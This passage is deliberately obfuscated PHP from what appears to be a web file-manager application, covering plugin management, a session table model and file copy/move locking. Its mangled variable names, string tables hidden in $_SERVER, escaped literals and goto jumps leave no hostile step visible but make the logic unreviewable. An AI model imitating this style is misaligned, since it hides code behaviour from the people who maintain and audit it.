($©¢‡±¶[$Üœ¢²Şú[2089]] as $˜¨¤‹´ => $ÅÎ½ãá–) { Hook::bind($˜¨¤‹´, $ÅÎ½ãá–); } } Hook::trigger($Üœ¢²Şú[2090]); Hook::trigger(ACTION); } public function appAllow($‘„ª¢ãĞ, $Ô£ÔÍöµ, $©µ£™š = true) { $Ğğ­î¾İ =& $_SERVER[Ş­ğŠìÒ]; $‘›Ìñ±¾ = PLUGIN_DIR . $‘„ª¢ãĞ . $Ğğ­î¾İ[2091]; if (!is_array($Ô£ÔÍöµ) || !is_array($Ô£ÔÍöµ[$Ğğ­î¾İ[2089]]) || $Ô£ÔÍöµ[$Ğğ­î¾İ[817]] != 1 || !is_file($‘›Ìñ±¾)) { return !1; } if (KodUser::isRoot()) { if ($GLOBALS[$Ğğ­î¾İ[6]][$Ğğ­î¾İ[2092]] || !$GLOBALS[$Ğğ­î¾İ[6]][$Ğğ­î¾İ[2093]]) { return !0; } $öÙ§ †â = explode($Ğğ­î¾İ[50], strtolower($GLOBALS[$Ğğ­î¾İ[6]][$Ğğ­î¾İ[2093]])); return in_array(strtolower($‘„ª¢ãĞ), $öÙ§ †â) ? !1 : !0; } if ($©µ£™š && !Action($Ğğ­î¾İ[2094])->checkAuth($‘„ª¢ãĞ)) { return !1; } return !0; } public function unInstall($²‘½²®´) { $±ÉÆ¿ä¸ =& $_SERVER[Ş­ğŠìÒ]; $äÔâ˜¯œ = $this->loadList($²‘½²®´); if (file_exists(PLUGIN_DIR . $²‘½²®´)) { Hook::apply($²‘½²®´ . $±ÉÆ¿ä¸[2095]); } $this->remove($äÔâ˜¯œ[$±ÉÆ¿ä¸[475]]); } public function changeStatus($ì¹ãĞ, $‹Ñ­í¹ä) { $£°¯‡ =& $_SERVER[Ş­ğŠìÒ]; $…ùÍ¼¨Ã = $this->loadList($ì¹ãĞ); if ($‹Ñ­í¹ä) { Hook::apply($ì¹ãĞ . $£°¯‡[2096]); } $this->update($…ùÍ¼¨Ã[$£°¯‡[475]], array($£°¯‡[2097] => $‹Ñ­í¹ä)); } public function appRegist($ŒäİûÀ§, $Ñ¬‚™âÈ) { $³ÈÎè =& $_SERVER[Ş­ğŠìÒ]; $¥¤ã¸æ = $this->loadList($ŒäİûÀ§); if ($¥¤ã¸æ) { $this->update($¥¤ã¸æ[$³ÈÎè[475]], array($³ÈÎè[2089] => $Ñ¬‚™âÈ)); } else { $Ê›ÍÓÊ = array($³ÈÎè[32] => $ŒäİûÀ§, $³ÈÎè[2089] => $Ñ¬‚™âÈ, $³ÈÎè[817] => 0, $³ÈÎè[6] => $this->getConfigDefault($ŒäİûÀ§)); $this->insert($Ê›ÍÓÊ); } } public function getConfigDefault($šÓÍö­¼) { $µÚàúØ =& $_SERVER[Ş­ğŠìÒ]; $Úü¢Ğ¢’ = array(); $×ƒ‚¡Å¸ = $this->getPackageJson($šÓÍö­¼); if (!$×ƒ‚¡Å¸ && is_array($×ƒ‚¡Å¸[$µÚàúØ[2098]])) { return $Úü¢Ğ¢’; } foreach ($×ƒ‚¡Å¸[$µÚàúØ[2098]] as $İäœĞÜŞ => $ûÓÅˆõ•) { if (!isset($ûÓÅˆõ•[$µÚàúØ[450]]) || isset($Úü¢Ğ¢’[$İäœĞÜŞ])) { continue; } $Úü¢Ğ¢’[$İäœĞÜŞ] = $ûÓÅˆõ•[$µÚàúØ[450]]; } return $Úü¢Ğ¢’; } public function getPackageJson($ì·‚¯ûó) { return Hook::apply($ì·‚¯ûó . $_SERVER[Ş­ğŠìÒ][2099]); } public function getConfig($¼¼¹œ¦¤, $¶¯ø‚è· = false) { $à‡æµÇ° =& $_SERVER[Ş­ğŠìÒ]; $Ñ¤öİşá = array(); $¢÷Â‰” = $this->loadList($¼¼¹œ¦¤); if ($¢÷Â‰” && is_array($¢÷Â‰”[$à‡æµÇ°[6]])) { $Ñ¤öİşá = $¢÷Â‰”[$à‡æµÇ°[6]]; } if (!$Ñ¤öİşá || $¶¯ø‚è·) { $Ñ¤öİşá = $this->getConfigDefault($¼¼¹œ¦¤); } return $Ñ¤öİşá; } public function setConfig($Í¾Ûõ±È, $×üÊı½ğ = false) { $’İ‡úü =& $_SERVER[Ş­ğŠìÒ]; $Ûêñ¡è = $this->loadList($Í¾Ûõ±È); if (!$Ûêñ¡è) { return !1; } $Å²“…ÛÃ = $Ûêñ¡è[$’İ‡úü[6]]; if ($×üÊı½ğ == !1) { $Å²“…ÛÃ = array(); $×üÊı½ğ = $this->getConfigDefault($Í¾Ûõ±È); } foreach ($×üÊı½ğ as $±ıíœÃû => $¤ƒ·Ú®) { $Å²“…ÛÃ[$±ıíœÃû] = is_string($¤ƒ·Ú®) ? trim($¤ƒ·Ú®) : $¤ƒ·Ú®; } $this->update($Ûêñ¡è[$’İ‡úü[475]], array($’İ‡úü[6] => $Å²“…ÛÃ)); } public function viewList() { $£şıùàÖ =& $_SERVER[Ş­ğŠìÒ]; $÷ÅïüÁ› = $this->loadList(); $this->pluginScan($÷ÅïüÁ›); $÷ÅïüÁ› = $this->loadPluginList(); $´Î€¹° = array(); foreach ($÷ÅïüÁ› as $Ş£Å³­Ã => $ÍÊø£ïÛ) { $ˆé”‚á¡ = $ÍÊø£ïÛ; unset($ÍÊø£ïÛ[$£şıùàÖ[2089]], $ÍÊø£ïÛ[$£şıùàÖ[6]]); $µİëÚ = PLUGIN_DIR . $ÍÊø£ïÛ[$£şıùàÖ[32]] . $£şıùàÖ[2091]; if (!is_file($µİëÚ)) { continue; } $²íÖÏã = Hook::apply($ÍÊø£ïÛ[$£şıùàÖ[32]] . $£şıùàÖ[2099]); if (!is_array($²íÖÏã)) { continue; } $´Î€¹°[$Ş£Å³­Ã] = array_merge($ÍÊø£ïÛ, $²íÖÏã); if ($ˆé”‚á¡[$£şıùàÖ[6]][$£şıùàÖ[1678]] != $²íÖÏã[$£şıùàÖ[1652]]) { Hook::apply($ÍÊø£ïÛ[$£şıùàÖ[32]] . $£şıùàÖ[2096]); $ˆé”‚á¡[$£şıùàÖ[6]][$£şıùàÖ[1678]] = $²íÖÏã[$£şıùàÖ[1652]]; $this->update($ÍÊø£ïÛ[$£şıùàÖ[475]], array($£şıùàÖ[6] => $ˆé”‚á¡[$£şıùàÖ[6]])); } } return $´Î€¹°; } private function loadPluginList() { $Ïœ îÆ =& $_SERVER[Ş­ğŠìÒ]; $ú‘Àíç³ = $this->loadList(); if (strtolower(MOD) == $Ïœ îÆ[2100]) { return $ú‘Àíç³; } $ğú ÎÌé = Hook::trigger($Ïœ îÆ[2101], $ú‘Àíç³); if ($ú‘Àíç³ && !$ğú ÎÌé) { die; } return $ğú ÎÌé ? $ğú ÎÌé : $ú‘Àíç³; } private function pluginScan($ˆÒ«®Ú÷) { $ê¯èÍÆú =& $_SERVER[Ş­ğŠìÒ]; recursion_dir(PLUGIN_DIR, $¿­¡˜†», $ˆØ›ªş, 0); foreach ($¿­¡˜†» as $š±ñ£îÅ) { $±©®ù™ö = get_path_this($š±ñ£îÅ); if (isset($ˆÒ«®Ú÷[$±©®ù™ö]) || !file_exists($š±ñ£îÅ . $ê¯èÍÆú[2102]) || !file_exists($š±ñ£îÅ . $ê¯èÍÆú[2091])) { continue; } Hook::apply($±©®ù™ö . $ê¯èÍÆú[2096]); } } } class SessionModel extends ModelBase { protected $tableName = "\163\x79\163\x74\145\x6d\137\x73\145\163\x73\151\157\156"; public function get($•¿Ö‹„Á) { $“ÛÒÒœé =& $_SERVER[Ş­ğŠìÒ]; $ÕÚâåì = $this->where(array($“ÛÒÒœé[2103] => $•¿Ö‹„Á))->find(); if (!is_array($ÕÚâåì)) { return !1; } return $ÕÚâåì[$“ÛÒÒœé[171]]; } public function set($óé„¨¢, $ÒÎÑ²óŒ, $å´÷õÔò = 3600) { $Ãø™îó =& $_SERVER[Ş­ğŠìÒ]; $¤ş¡Úƒ = array($Ãø™îó[2103] => $óé„¨¢, $Ãø™îó[2003] => $ÒÎÑ²óŒ, $Ãø™îó[2104] => $å´÷õÔò + time()); if (Session::get($Ãø™îó[2105])) { $¤ş¡Úƒ[$Ãø™îó[1764]] = Session::get($Ãø™îó[2105]); } else { $¤ş¡Úƒ[$Ãø™îó[1764]] = 0; } if ($this->get($óé„¨¢)) { return $this->where(array($Ãø™îó[2103] => $óé„¨¢))->save($¤ş¡Úƒ); } else { return $this->add($¤ş¡Úƒ, array(), !0); } } public function remove($„™éß—¦) { return $this->where(array($_SERVER[Ş­ğŠìÒ][2103] => $„™éß—¦))->delete(); } public function clearTimeout() { return $this->where($_SERVER[Ş­ğŠìÒ][2106] . time())->delete(); } } goto C†Œø¨”Ú; EøÛù…Á„: class SourceListMoveModel extends SourceListModel { public $allowLockSource = 1; public $moveClearAuth = true; public function allowLock() { return $this->allowLockSource; } public function lockCopyStart($Áğ¤ºè) { $åêÓÄ½ =& $_SERVER[Ş­ğŠìÒ]; if (!$this->allowLock()) { return; } $this->_lockCheck($åêÓÄ½[618], $Áğ¤ºè); $°Ãê†» = 1; $this->_lockEvent($Áğ¤ºè, array($åêÓÄ½[619], $åêÓÄ½[620]), $°Ãê†»); $this->_lockParent($Áğ¤ºè, array($åêÓÄ½[620]), $°Ãê†»); $this->_lockEvent($Áğ¤ºè, array($åêÓÄ½[621], $åêÓÄ½[622]), $°Ãê†»); $this->_lockCheckEnd($åêÓÄ½[618], $Áğ¤ºè); } public function lockCopyEnd($ÍúÚº™í) { $¨ÖëÛæè =& $_SERVER[Ş­ğŠìÒ]; if (!$this->allowLock()) { return; } $“ÒÎ› = 0; $this->_lockEvent($ÍúÚº™í, array($¨ÖëÛæè[619], $¨ÖëÛæè[620]), $“ÒÎ›); $this->_lockParent($ÍúÚº™í, array($¨ÖëÛæè[620]), $“ÒÎ›); $this->_lockEvent($ÍúÚº™í, array($¨ÖëÛæè[621], $¨ÖëÛæè[622]), $“ÒÎ›); } public function lockWriteStart($’ÛËôé¦, $„Ëò¥È = '') { $îŠòÄ£ =& $_SERVER[Ş­ğŠìÒ]; if (!$this->allowLock()) { return; } $this->_lockCheck($îŠòÄ£[619], $’ÛËôé¦); $‡¼İûÄ® = 1; $this->_lockKey($îŠòÄ£[623] . $’ÛËôé¦ . $îŠòÄ£[10] . $„Ëò¥È, $‡¼İûÄ®); $this->_lockEvent($’ÛËôé¦, array($îŠòÄ£[618], $îŠòÄ£[620]), $‡¼İûÄ®); $this->_lockParent($’ÛËôé¦, array($îŠòÄ£[618], $îŠòÄ£[620]), $‡¼İûÄ®); $this->_lockCheckEnd($îŠòÄ£[619], $’ÛËôé¦); } public function lockWriteEnd($ïîâËŠæ, $­ÒöŒ½Â = '') { $àØÙÜà† =& $_SERVER[Ş­ğŠìÒ]; if (!$this->allowLock()) { return; } $Á´öï„á = 0; $this->_lockKey($àØÙÜà†[623] . $ïîâËŠæ . $àØÙÜà†[10] . $­ÒöŒ½Â, $Á´öï„á); $this->_lockEvent($ïîâËŠæ, array($àØÙÜà†[618], $àØÙÜà†[620]), $Á´öï„á); $this->_lockParent($ïîâËŠæ, array($àØÙÜà†[618], $àØÙÜà†[620]), $Á´öï„á); } public function lockMoveStart($Ó‡ è•İ) { $ÓÈÔ²ë =& $_SERVER[Ş­ğŠìÒ]; if (!$this->allowLock()) { return; } $this->_lockCheck($ÓÈÔ²ë[620], $Ó‡ è•İ); $¶õ­åı° = 1; $this->_lockKey($ÓÈÔ²ë[624] . $Ó‡ è•İ, $¶õ­åı°); $this->_lockEvent($Ó‡ è•İ, array($ÓÈÔ²ë[618], $ÓÈÔ²ë[619]), $¶õ­åı°); $this->_lockParent($Ó‡ è•İ, array($ÓÈÔ²ë[618], $ÓÈÔ²ë[620]), $¶õ­åı°); $this->_lockEvent($Ó‡ è•İ, array($ÓÈÔ²ë[625], $ÓÈÔ²ë[621], $ÓÈÔ²ë[622]), $¶õ­åı°); $this->_lockCheckEnd($ÓÈÔ²ë[620], $Ó‡ è•İ); } public function lockMoveEnd($—¢ª¿) { $Ùê§ê¦ =& $_SERVER[Ş­ğŠìÒ]; if (!$this->allowLock()) { return; } $‹ğÖ•‘‘ = 0; $this->_lockKey($Ùê§ê¦[624] . $—¢ª¿, $‹ğÖ•‘‘); $this->_lockEvent($—¢ª¿, array($Ùê§ê¦[618], $Ùê§ê¦[619]), $‹ğÖ•‘‘); $this->_lockParent($—¢ª¿, array($Ùê§ê¦[618], $Ùê§ê¦[620]), $‹ğÖ•‘‘); $this->_lockEvent($—¢ª¿, array($Ùê§ê¦[625], $Ùê§ê¦[621], $Ùê§ê¦[622]), $‹ğÖ•‘‘); } private function _lockCheck($¦ı€âÙ¡, $öÕŸ¡Ö£) { $‰¥Õ²×« =& $_SERVER[Ş­ğŠìÒ]; $‘ó‡Ò’† = $this->sourceInfo($öÕŸ¡Ö£); $Ç«êûİ = $¦ı€âÙ¡ . $‰¥Õ²×«[10] . $öÕŸ¡Ö£; $this->_lockTimeStart[$Ç«êûİ] = timeFloat(); if (!is_array($‘ó‡Ò’†)) { return; } $ …ó€îö = LNG($‰¥Õ²×«[626]); CacheLock::setErrorMsg($‰¥Õ²×«[176] . htmlspecialchars($‘ó‡Ò’†[$‰¥Õ²×«[32]]) . $‰¥Õ²×«[178] . $ …ó€îö); $this->_lockKey($Ç«êûİ, 1); $this->_lockKey($Ç«êûİ, 0); $·Æ…™µ¼ = array_reverse($this->parentLevelArray($‘ó‡Ò’†[$‰¥Õ²×«[584]])); foreach ($·Æ…™µ¼ as $ØŒÖ·’¿) { $Ç«êûİ = $¦ı€âÙ¡ . $‰¥Õ²×«[627] . $ØŒÖ·’¿; if (CacheLock::lockGet($‰¥Õ²×«[628] . $Ç«êûİ)) { $‘ó‡Ò’† = $this->sourceInfo($ØŒÖ·’¿); CacheLock::setErrorMsg($‰¥Õ²×«[176] . htmlspecialchars($‘ó‡Ò’†[$‰¥Õ²×«[32]]) . $‰¥Õ²×«[178] . $ …ó€îö); $this->_lockKey($Ç«êûİ, 1); $this->_lockKey($Ç«êûİ, 0); } } } private function _lockCheckEnd($â´±åÃ, $Î·²ş¢´) { $ñ¥Ñºíö =& $_SERVER[Ş­ğŠìÒ]; $¬â”¢«¿ = $â´±åÃ . $ñ¥Ñºíö[10] . $Î·²ş¢´; CacheLock::setErrorMsg($ñ¥Ñºíö[454]); if (!isset($this->_lockTimeStart[$¬â”¢«¿])) { return; } $¸•èÀçÀ = timeFloat() - $this->_lockTimeStart[$¬â”¢«¿]; unset($this->_lockTimeStart[$¬â”¢«¿]); if ($¸•èÀçÀ > 0.5) { unset(self::$cacheSourceInfo[$ñ¥Ñºíö[533] . $Î·²ş¢´]); } $îÂÉÂ¸Õ = $this->sourceInfo($Î·²ş¢´); if (!$îÂÉÂ¸Õ) { show_json(LNG($ñ¥Ñºíö[108]), !1); } } private function _lockParent($¦÷Ä“ŸÈ, $óÁñ¶–, $ïÜ²œå») { if (!$this->autoLockSet) { return; } $‰‰ˆñ˜ø = $this->sourceInfo($¦÷Ä“ŸÈ); if (!is_array($‰‰ˆñ˜ø)) { return; } $Êñ©ôÂ¢ = array_reverse($this->parentLevelArray($‰‰ˆñ˜ø[$_SERVER[Ş­ğŠìÒ][584]])); foreach ($Êñ©ôÂ¢ as $³ÙÇüğ) { $this->_lockEvent($³ÙÇüğ, $óÁñ¶–, $ïÜ²œå»); } } private function _lockEvent($Äö¯öí•, $æ’­ÓÓê, $š¯šéìâ) { $ğÆ²˜ıá =& $_SERVER[Ş­ğŠìÒ]; if (!$this->autoLockSet) { return; } foreach ($æ’­ÓÓê as $¿ÏøŞ°ø) { $ÕÍ³÷ØŠ = $¿ÏøŞ°ø . $ğÆ²˜ıá[10] . $Äö¯öí•; if ($š¯šéìâ && CacheLock::lockGet($ğÆ²˜ıá[628] . $ÕÍ³÷ØŠ)) { continue; } $this->_lockKey($ÕÍ³÷ØŠ, $š¯šéìâ); } } public $_lockTimeStart = array(); public $_lockTime = 5; private static $_lockItemArr = array(); private function _lockKey($ÀğƒîÎ, $Ôı„Ã» = 1) { $ã˜ÏŞûÖ = $_SERVER[Ş­ğŠìÒ][628] . md5($ÀğƒîÎ); if ($Ôı„Ã») { if (isset(self::$_lockItemArr[$ã˜ÏŞûÖ])) { return; } self::$_lockItemArr[$ã˜ÏŞûÖ] = 1; CacheLock::lock($ã˜ÏŞûÖ, $this->_lockTime); } else { if (!isset(self::$_lockItemArr[$ã˜ÏŞûÖ])) { return; } unset(self::$_lockItemArr[$ã˜ÏŞûÖ]); CacheLock::unlock($ã˜ÏŞûÖ); } } public function isParentOf($û¢±õ€, $Ï°øìÕÜ) { $ò¿ì×€ =& $_SERVER[Ş­ğŠìÒ]; $ØÁª–…Ê = $this->sourceInfo($û¢±õ€); $ÀÜô—å¹ = $this->sourceInfo($Ï°øìÕÜ); $–†æœ˜Î = $ØÁª–…Ê[$ò¿ì×€[584]] . $ØÁª–…Ê[$ò¿ì×€[193]] . $ò¿ì×€[50]; $ì‡Áºµô = $ÀÜô—å¹[$ò¿ì×€[584]] . $ÀÜô—å¹[$ò¿ì×€[193]] . $ò¿ì×€[50]; $››˜ˆ£ = strpos($ì‡Áºµô, $–†æœ˜Î) === 0; return $››˜ˆ£; } private $targetIsDelete = 0; public function copy($³ŞĞ¥–¾, $° â“Ó, $âÀ´Ø± = REPEAT_REPLACE, $°ìÂ„Ë£ = '') { $òŒüÛÛ¾ =& $_SERVER[Ş­ğŠìÒ]; $¾•©ú½î = $this->sourceInfo($³ŞĞ¥–¾); $‹×Á”‡î = $this->sourceInfo($° â“Ó); if (!$¾•©ú½î || !$‹×Á”‡î || $‹×Á”‡î[$òŒüÛÛ¾[485]] != $òŒüÛÛ¾[91]) { return !1; } if ($this->isParentOf($³ŞĞ¥–¾, $° â“Ó)) { return !1; } $µøÏ¦¯½ = $°ìÂ„Ë£ ? $°ìÂ„Ë£ : $¾•©ú½î[$òŒüÛÛ¾[32]]; $this->lockCopyStart($³ŞĞ¥–¾); $this->lockWriteStart($° â“Ó, $µøÏ¦¯½); $ìÜˆ”²€ = array($òŒüÛÛ¾[629] => array(), $òŒüÛÛ¾[630] => array(), $òŒüÛÛ¾[631] => array()); $this->targetIsDelete = intval($¾•©ú½î[$òŒüÛÛ¾[505]]); $†àç÷»ø = $this->fileNameExistAuto($° â“Ó, $¾•©ú½î); $ ğç‹â“ = $this->_copy($³ŞĞ¥–¾, $° â“Ó, $âÀ´Ø±, $ìÜˆ”²€, !0, $°ìÂ„Ë£); $this->_childrenListClear(); $this->lockCopyEnd($³ŞĞ¥–¾); $this->lockWriteEnd($° â“Ó, $µøÏ¦¯½); if ($¾•©ú½î[$òŒüÛÛ¾[485]] == $òŒüÛÛ¾[91] && $†àç÷»ø == $ ğç‹â“) { $this->folderSizeResetChildren($†àç÷»ø); } Model($òŒüÛÛ¾[632])->addAll($ìÜˆ”²€[$òŒüÛÛ¾[630]], array(), !0); if ($†àç÷»ø != $ ğç‹â“ || $¾•©ú½î[$òŒüÛÛ¾[485]] == $òŒüÛÛ¾[91]) { Model($òŒüÛÛ¾[633])->eventCopy($ ğç‹â“); } $this->saveAll($ìÜˆ”²€[$òŒüÛÛ¾[631]]); Model($òŒüÛÛ¾[230])->linkAdd($ìÜˆ”²€[$òŒüÛÛ¾[629]]); $this->folderSizeReset($° â“Ó); $this->updateModifyTime($° â“Ó); return $ ğç‹â“; } private function _copy($ĞÄç¨…£, $³Ÿ¸»öÂ, $è»òŞ˜÷, &$°ÃÕ…ñç, $§ÕÉœó­, $ÖöÎ¡Æ° = '') { $ÚùÙÉÉİ =& $_SERVER[Ş­ğŠìÒ]; $îÙ•ß = $this->sourceInfoCache($ĞÄç¨…£); $à£¡­Ë = $îÙ•ß[$ÚùÙÉÉİ[485]] == $ÚùÙÉÉİ[91]; $‹ª¿Œóù = $ÖöÎ¡Æ° ? $ÖöÎ¡Æ° : $îÙ•ß[$ÚùÙÉÉİ[32]]; $³™¾ØêË = $this->fileNameExistAuto($³Ÿ¸»öÂ, $îÙ•ß); if ($§ÕÉœó­) { $this->_childrenAllMake($ĞÄç¨…£); if ($à£¡­Ë && $³™¾ØêË) { $this->_childrenAllMake($³™¾ØêË); } } if (!$³™¾ØêË) { return $this->_copyCreate($ĞÄç¨…£, $³Ÿ¸»öÂ, $‹ª¿Œóù, $°ÃÕ…ñç); } $ö‚¿ªÓÈ = $³™¾ØêË; if ($à£¡­Ë) { if ($è»òŞ˜÷ == REPEAT_RENAME_FOLDER) { $‹ª¿Œóù = $this->fileNameAutoCache($³Ÿ¸»öÂ, $‹ª¿Œóù, $è»òŞ˜÷, $à£¡­Ë); $ö‚¿ªÓÈ = $this->_copyCreate($ĞÄç¨…£, $³Ÿ¸»öÂ, $‹ª¿Œóù, $°ÃÕ…ñç); } else { $öòÕŒÃì = $this->_childrenList($ĞÄç¨…£); foreach ($öòÕŒÃì as $·¹Â©«ò) { $this->_copy($·¹Â©«ò[$ÚùÙÉÉİ[193]], $³™¾ØêË, $è»òŞ˜÷, $°ÃÕ…ñç, !1); } } } else { if ($è»òŞ˜÷ == REPEAT_RENAME || $è»òŞ˜÷ == REPEAT_RENAME_FOLDER) { $‹ª¿Œóù = $this->fileNameAutoCache($³Ÿ¸»öÂ, $‹ª¿Œóù, $è»òŞ˜÷, $à£¡­Ë); $ö‚¿ªÓÈ = $this->_copyCreate($ĞÄç¨…£, $³Ÿ¸»öÂ, $‹ª¿Œóù, $°ÃÕ…ñç); } else { if ($è»òŞ˜÷ == REPEAT_REPLACE) { $ş„“Ô „ = $this->sourceInfoCache($³™¾ØêË); $Ö²“øà = $this->fileHistory($ş„“Ô „, $îÙ•ß[$ÚùÙÉÉİ[541]], $îÙ•ß[$ÚùÙÉÉİ[79]]); if ($Ö²“øà) { $°ÃÕ…ñç[$ÚùÙÉÉİ[629]][] = $îÙ•ß[$ÚùÙÉÉİ[541]]; } } else { if ($è»òŞ˜÷ == REPEAT_SKIP) { } } } Hook::trigger($ÚùÙÉÉİ[634], array($ÚùÙÉÉİ[635], $îÙ•ß, 0)); } return $ö‚¿ªÓÈ; } private function _copyCreate($ùç¥åù–, $Ğµˆ†Âå, $ŒâõÅƒÈ, &$Ôíç¶Ó×) { $õºÂïÕà =& $_SERVER[Ş­ğŠìÒ]; $ğ•¤º·€ = $this->sourceInfoCache($ùç¥åù–); $Ø¿¢ÂĞş = $this->sourceInfoCache($Ğµˆ†Âå); $«éí«—œ = $this->_makeItemData($ğ•¤º·€, $Ø¿¢ÂĞş, $ŒâõÅƒÈ); Hook::trigger($õºÂïÕà[636], $«éí«—œ); Hook::trigger($õºÂïÕà[637], array($õºÂïÕà[638], $«éí«—œ, 0)); $•­á”ÂÒ = $this->add($«éí«—œ); $ ŞÒ‡€Õ = array($õºÂïÕà[193] => $•­á”ÂÒ, $õºÂïÕà[32] => $ŒâõÅƒÈ); $this->_copyApplyMeta($ ŞÒ‡€Õ, $Ôíç¶Ó×); if ($ğ•¤º·€[$õºÂïÕà[485]] != $õºÂïÕà[91]) { $Ôíç¶Ó×[$õºÂïÕà[629]][] = $ğ•¤º·€[$õºÂïÕà[541]]; return $•­á”ÂÒ; } $ş”»ÓüÔ = array(); $¿ĞÙÍó¹ = array(); $this->_childrenListAll($ùç¥åù–, $ş”»ÓüÔ); $æÇ†Ù¦ = count($ş”»ÓüÔ); if ($æÇ†Ù¦ == 0) { return $•­á”ÂÒ; } $ğ•òŒŸƒ = $this->sourceInfo($•­á”ÂÒ); foreach ($ş”»ÓüÔ as $á‡ì¬½Ü) { $ìê¹î¤‹ = $this->_makeItemData($á‡ì¬½Ü, $ğ•òŒŸƒ, $á‡ì¬½Ü[$õºÂïÕà[32]]); $ìê¹î¤‹[$õºÂïÕà[584]] = $á‡ì¬½Ü[$õºÂïÕà[584]]; $¿ĞÙÍó¹[] = $ìê¹î¤‹; } $this->chunkEventSet($õºÂïÕà[639], array($õºÂïÕà[640], $«éí«—œ, $æÇ†Ù¦)); $this->addAll($¿ĞÙÍó¹, array(), !1); $˜î“…Â§ = $this->where(array($õºÂïÕà[192] => $•­á”ÂÒ))->select(); $Ëç¹ÜĞ = $this->_childrenMakeRelation($ş”»ÓüÔ, $˜î“…Â§); $Ëç¹ÜĞ[$ùç¥åù–] = $•­á”ÂÒ; $—‹ ö€ = array(); $ı™íÓşè = array(); foreach ($˜î“…Â§ as $á‡ì¬½Ü) { $”‘Í¦ß§ = $á‡ì¬½Ü[$õºÂïÕà[193]]; $ŞÓµ¹¬ = $this->_childrenMatch($Ëç¹ÜĞ, $á‡ì¬½Ü, $ğ•òŒŸƒ); $—‹ ö€[] = array($õºÂïÕà[193], $”‘Í¦ß§, $õºÂïÕà[192], $ŞÓµ¹¬[$õºÂïÕà[192]]); $ı™íÓşè[] = array($õºÂïÕà[193], $”‘Í¦ß§, $õºÂïÕà[584], $ŞÓµ¹¬[$õºÂïÕà[584]]); $this->_copyApplyMeta($á‡ì¬½Ü, $Ôíç¶Ó×); if ($á‡ì¬½Ü[$õºÂïÕà[485]] != $õºÂïÕà[91]) { $Ôíç¶Ó×[$õºÂïÕà[629]][] = $á‡ì¬½Ü[$õºÂïÕà[541]]; } } $this->chunkEventSet($õºÂïÕà[641], array($õºÂïÕà[642], $«éí«—œ, $æÇ†Ù¦)); $this->saveAll($—‹ ö€); $this->chunkEventSet($õºÂïÕà[643], array($õºÂïÕà[644], $«éí«—œ, $æÇ†Ù¦)); $this->saveAll($ı™íÓşè); return $•­á”ÂÒ; } private function _childrenMakeRelation($ÆÃàÕ²µ, $ÉØ™§ş) { $œ±ùÏÊş =& $_SERVER[Ş­ğŠìÒ]; $îùó¼² = array(); $ñÛñ—„ = array(); foreach ($ÆÃàÕ²µ as $ÄÖÛ†Ò•) { $”ÁëÇƒ‘ = $ÄÖÛ†Ò•[$œ±ùÏÊş[32]] . $œ±ùÏÊş[8] . $ÄÖÛ†Ò•[$œ±ùÏÊş[584]]; $îùó¼²[$”ÁëÇƒ‘] = $ÄÖÛ†Ò•[$œ±ùÏÊş[193]]; } foreach ($ÉØ™§ş as $ÄÖÛ†Ò•) { $”ÁëÇƒ‘ = $ÄÖÛ†Ò•[$œ±ùÏÊş[32]] . $œ±ùÏÊş[8] . $ÄÖÛ†Ò•[$œ±ùÏÊş[584]]; $‹†¹±¤ç = $îùó¼²[$”ÁëÇƒ‘]; $ñÛñ—„[$‹†¹±¤ç] = $ÄÖÛ†Ò•[$œ±ùÏÊş[193]]; } return $ñÛñ—„; } private function _childrenMatch($†§–¹ó‘, $ìÏõªçğ, $³ èò») { $™»úáù… =& $_SERVER[Ş­ğŠìÒ]; $ÚèûÙ¶Û = $³ èò»[$™»úáù…[584]]; $¬… Üı‘ = $this->parentLevelArray($ìÏõªçğ[$™»úáù…[584]]); foreach ($¬… Üı‘ as $‹ÁÓºæê) { if (isset($†§–¹ó‘[$‹ÁÓºæê])) { $ÚèûÙ¶Û .= $†§–¹ó‘[$‹ÁÓºæê] . $™»úáù…[645]; } } $ÚèûÙ¶Û = rtrim($ÚèûÙ¶Û, $™»úáù…[50]) . $™»úáù…[50]; $ğ©åç° = $this->parentLevelArray($ÚèûÙ¶Û); $î±Â®êÅ = $ğ©åç°[count($ğ©åç°) - 1]; return array($™»úáù…[192] => $î±Â®êÅ, $™»úáù…[584] => $ÚèûÙ¶Û); } private function _makeItemData($Áá´„†ö, $¢È…–£¿, $ÓŞ“ç½—) { $¬ş‚İ…‰ =& $_SERVER[Ş­ğŠìÒ]; $îœ‚âØ = array($¬ş‚İ…‰[646] => $Áá´„†ö[$¬ş‚İ…‰[485]], $¬ş‚İ…‰[494] => $ÓŞ“ç½—, $¬ş‚İ…‰[647] => $Áá´„†ö[$¬ş‚İ…‰[486]] ? $Áá´„†ö[$¬ş‚İ…‰[486]] : $¬ş‚İ…‰[12], $¬ş‚İ…‰[542] => $Áá´„†ö[$¬ş‚İ…‰[541]] ? $Áá´„†ö[$¬ş‚İ…‰[541]] : 0, $¬ş‚İ…‰[617] => $Áá´„†ö[$¬ş‚İ…‰[79]] ? $Áá´„†ö[$¬ş‚İ…‰[79]] : 0, $¬ş‚İ…‰[648] => intval($¢È…–£¿[$¬ş‚İ…‰[190]]), $¬ş‚İ…‰[649] => intval($¢È…–£¿[$¬ş‚İ…‰[569]]), $¬ş‚İ…‰[650] => intval(USER_ID), $¬ş‚İ…‰[651] => intval(USER_ID), $¬ş‚İ…‰[477] => intval($¢È…–£¿[$¬ş‚İ…‰[193]]), $¬ş‚İ…‰[652] => $¢È…–£¿[$¬ş‚İ…‰[584]] . $¢È…–£¿[$¬ş‚İ…‰[193]] . $¬ş‚İ…‰[50], $¬ş‚İ…‰[498] => $Áá´„†ö[$¬ş‚İ…‰[88]] ? $Áá´„†ö[$¬ş‚İ…‰[88]] : time(), $¬ş‚İ…‰[504] => 0, $¬ş‚İ…‰[653] => $¬ş‚İ…‰[12]); return $îœ‚âØ; } private function _copyApplyMeta($§…å•±, &$´ğ™òÉ—) { $Ãâ¼Ñ°¼ =& $_SERVER[Ş­ğŠìÒ]; $İÌ˜€‘å = $§…å•±[$Ãâ¼Ñ°¼[193]]; $®Ç½Öİã = $§…å•±[$Ãâ¼Ñ°¼[32]]; if (!isset($§…å•±[$Ãâ¼Ñ°¼[654]]) || !$§…å•±[$Ãâ¼Ñ°¼[654]] || $§…å•±[$Ãâ¼Ñ°¼[654]] == $Ãâ¼Ñ°¼[228]) { $´ğ™òÉ—[$Ãâ¼Ñ°¼[631]][] = array($Ãâ¼Ñ°¼[193], $İÌ˜€‘å, $Ãâ¼Ñ°¼[654], short_id($İÌ˜€‘å)); } if (Input::check($®Ç½Öİã, $Ãâ¼Ñ°¼[655])) { $´ğ™òÉ—[$Ãâ¼Ñ°¼[630]][] = 